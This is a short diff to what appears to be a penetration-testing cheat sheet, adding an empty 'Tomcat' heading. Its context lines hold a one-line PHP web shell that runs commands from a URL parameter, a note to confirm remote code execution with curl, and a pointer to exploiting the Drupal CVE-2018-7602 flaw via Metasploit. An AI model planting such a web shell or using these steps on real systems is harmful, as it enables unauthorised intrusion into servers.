@@ -262,3 +262,6 @@ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
 * confirm rce with curl
 3. [CVE-2018-7602](https://github.com/rithchard/Drupalgeddon3)
 * can exploit this using Metasploit, but we must first log in and obtain a valid session cookie
+
+# Tomcat
+* 
